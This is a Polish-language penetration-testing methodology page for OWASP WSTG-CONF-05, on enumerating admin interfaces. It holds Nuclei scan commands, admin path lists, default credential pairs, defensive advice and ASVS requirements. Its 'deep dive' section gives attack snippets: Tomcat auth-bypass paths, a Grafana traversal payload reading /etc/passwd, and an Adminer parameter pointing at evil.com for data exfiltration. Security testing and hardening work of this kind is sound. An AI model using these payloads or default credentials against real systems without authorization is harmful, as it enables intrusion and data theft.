# WSTG-CONF-05 — Enumerate Infrastructure and Application Admin Interfaces

## Cel

Identyfikacja paneli administracyjnych aplikacji (WordPress wp-admin, Joomla administrator, Spring Actuator) oraz infrastruktury (Tomcat manager, Jenkins, phpMyAdmin, Kibana, Grafana). Panele admin często mają default credentials lub auth bypass i są pivot do pełnego compromise.

## Automatyzacja Nuclei

Test pokrywa się z **WSTG-INFO-04** (attack surface) — używamy tego samego szablonu plus oficjalnych:

```bash
# Nasze attack-surface (admin panels + actuator + debug)
nuclei -l burp-export.xml -im burp \
       -t templates/wstg-info-04-attack-surface.yaml

# Oficjalna baza paneli
nuclei -l burp-export.xml -im burp \
       -t resources/nuclei-templates/http/exposed-panels/

# Default logins per panel
nuclei -l burp-export.xml -im burp \
       -t resources/nuclei-templates/http/default-logins/

# Konkretne panele wysokiego ryzyka
nuclei -l burp-export.xml -im burp \
       -t resources/nuclei-templates/http/exposed-panels/jenkins.yaml \
       -t resources/nuclei-templates/http/exposed-panels/grafana-detect.yaml \
       -t resources/nuclei-templates/http/exposed-panels/kibana.yaml \
       -t resources/nuclei-templates/http/exposed-panels/phpmyadmin-panel.yaml
```

## Coverage Matrix

| Wymiar | Pokryte przez | Notka |
|---|---|---|
| Admin panels (wp-admin, /admin, /administrator) | WSTG-INFO-04 | nasz szablon |
| Spring Actuator chain | WSTG-INFO-04 + WSTG-CONF-02 | full pivot |
| Tomcat manager / host-manager | WSTG-INFO-04 | + http/default-logins |
| Jenkins, Grafana, Kibana, phpMyAdmin | http/exposed-panels/ | dedicated templates |
| Default credentials testing | http/default-logins/ | wymaga --include-credential-test |
| Subdomain admin panels | WSTG-CONF-10 + manual | admin.target.com discovery |

## Standard pentesterski — jak to robi się wzorowo

### Metodologia (5 kroków)

1. **Common admin paths**: `/admin`, `/administrator`, `/wp-admin`, `/manager`, `/console`, `/dashboard`.
2. **Service-specific paths**: per identyfikowany stack (z WSTG-INFO-08), uruchom dedicated checki.
3. **Subdomain admin discovery**: `admin.target.com`, `manage.target.com`, `internal.target.com`.
4. **Default credentials test**: tomcat/tomcat, admin/admin, root/root, jenkins (bez auth początkowo).
5. **MFA / IP whitelist verification**: w idealnym przypadku admin panel nie powinien być publicznie dostępny.

### Co MUSI być sprawdzone (12 punktów)

- [ ] `/admin`, `/administrator/`, `/wp-admin/`, `/manage`
- [ ] Subdomain admin panels (admin.target.com, manage.target.com)
- [ ] Tomcat `/manager/html`, `/host-manager/html`
- [ ] Spring `/actuator`
- [ ] phpMyAdmin (`/phpmyadmin/`, `/pma/`, `/mysql/`)
- [ ] Jenkins (`/login`, `/manage`)
- [ ] Grafana (`/login`)
- [ ] Kibana (`/app/home`, `/app/kibana`)
- [ ] Adminer (`/adminer.php`, `/adminer/`)
- [ ] JBoss (`/jmx-console/`, `/web-console/`, `/admin-console/`)
- [ ] Default credentials per panel (po identyfikacji)
- [ ] MFA enforcement check

## CHEATSHEET OWASP — Kluczowe wskazówki

> Źródło: OWASP CheatSheetSeries — Authentication_Cheat_Sheet.md, Access_Control_Cheat_Sheet.md

### Panele administracyjne — bezpieczeństwo

- **Nie umieszczaj** panelu admina pod przewidywalnymi URL-ami (`/admin`, `/administrator`, `/wp-admin`)
- Ogranicz dostęp do panelu admina przez **IP whitelist** lub **VPN**
- Wymagaj **MFA** dla wszystkich kont administracyjnych
- Osobna domena/subdomena dla panelu admina (np. `admin.internal.target.com`)
- Nie linkuj panelu admina z głównej strony — nie powinien być discoverable

### Typowe ścieżki paneli admina per technologia

| Technologia | Ścieżki |
|-------------|---------|
| WordPress | `/wp-admin`, `/wp-login.php` |
| Joomla | `/administrator` |
| Drupal | `/user/login`, `/admin` |
| Django | `/admin/` |
| phpMyAdmin | `/phpmyadmin/`, `/pma/`, `/mysql/` |
| Tomcat | `/manager/`, `/host-manager/` |
| Jenkins | `/login`, `/manage` |
| Kibana/Grafana | `/app/kibana`, `/grafana/login` |
| Spring Boot Actuator | `/actuator`, `/health`, `/env`, `/beans` |

### Obrona

- Zmień domyślną ścieżkę panelu admina na niestandardową
- Wdróż rate limiting na stronę logowania admina
- Monitoruj i alertuj na brute force na panelu admina
- Usuń niepotrzebne panele zarządzania (phpMyAdmin, Adminer) z produkcji
- Spring Boot: zabezpiecz endpointy Actuator — nie wystawiaj `/env`, `/configprops` publicznie

## Pentesterskie deep dive

### Mniej znane techniki

- **Tomcat manager bypass via path normalization**: `/manager/html/..;/`, `/manager%20/html` — niektóre wersje Tomcat traktują różnie. Klasyczna technika z research community.
- **Jenkins `script` console**: jeśli auth bypass na `/script` → Groovy console = pełen RCE. CVE-2018-1000861 i pochodne.
- **Spring Actuator chain → Cloud metadata leak**: `/actuator/env` z hardcoded `JAVA_OPTS=-Daws.profile=...` daje pivot do AWS IAM keys.
- **Adminer file upload + SQL injection**: Adminer z auto-login (`?driver=server&server=evil.com`) może być wykorzystany do data exfiltration.
- **Kibana RCE via Timelion (CVE-2019-7609)**: starsze wersje Kibana ma server-side prototype pollution → RCE.
- **Grafana plugin path traversal (CVE-2021-43798)**: `/public/plugins/<plugin>/../../../../../../etc/passwd`.

### Common pitfalls

- **WAF blokuje `/admin` ale przepuszcza `/Admin`**: case-sensitivity bypass.
- **Reverse proxy z SSO**: panel jest za SSO ale backend Tomcat manager dalej akceptuje basic auth. Bypass przez direct backend IP.
- **Subdomain enumeration pomija "admin-staging"**: typowe naming conventions (admin-stg, admin-uat, admin-test).

### Świeżynki z research

- **Spring Actuator + JNDI lookup → RCE** (CVE-2022-22963 chain)
- **Jenkins script console exploitation** — community pattern
- **Grafana CVE-2021-43798** path traversal
- **HackTricks Pentesting Web — per panel**: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web

## Rozszerzenia Burp Suite

| Rozszerzenie | Opis | Link |
|---|---|---|
| AdminPanelFinder | Enumeracja paneli admin | [GitHub](https://github.com/moeinfatehi/Admin-Panel_Finder) |

## Źródła

- WSTG: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/05-Enumerate_Infrastructure_and_Application_Admin_Interfaces
- ProjectDiscovery exposed-panels: https://github.com/projectdiscovery/nuclei-templates/tree/main/http/exposed-panels
- HackTricks Pentesting Web: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web

### Wskazówki ASVS

| ID | Sekcja | Wymaganie |
|---|---|---|
| V14.3.2 | Configuration (L2) | No default credentials, sample apps. |
| V4.3.1 | Other Access Control (L1) | Administrative interfaces use multi-factor authentication. |
| V4.3.2 | Other Access Control (L2) | Directory browsing disabled. |
